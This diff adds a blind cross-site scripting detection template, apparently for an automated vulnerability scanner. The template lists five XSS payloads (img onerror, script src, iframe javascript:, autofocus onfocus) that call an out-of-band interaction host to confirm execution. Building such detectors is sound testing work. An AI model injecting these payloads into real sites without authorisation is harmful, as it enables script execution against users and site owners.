@@ -1,0 +1,23 @@
+id: "xss-blind"
+issue_code: "xss_blind"
+detection_condition: "or"
+detection_methods:
+  - oob_interaction:
+      oob_address: "{{.oob_address}}"
+      confidence: 95
+vars:
+  - name: oob_address
+    value: "{{interactionAddress}}"
+  - name: random_param
+    value: "{{randomLowercaseString 6}}"
+templates:
+  - "'\"><img src=x onerror='fetch(\"http://{{.oob_address}}/{{.random_param}}\")'>"
+  - "'\"><img src=\"http://{{.oob_address}}/{{.random_param}}\">"
+  - "'\"><script src=http://{{.oob_address}}/{{.random_param}}></script>"
+  - "'\"><iframe src='javascript:fetch(\"http://{{.oob_address}}/{{.random_param}}\")'></iframe>"
+  - "<input onfocus='fetch(\"http://{{.oob_address}}/{{.random_param}}\")' autofocus>"
+categories:
+  - xss
+  - blind_xss
+  - oob
+  - injection
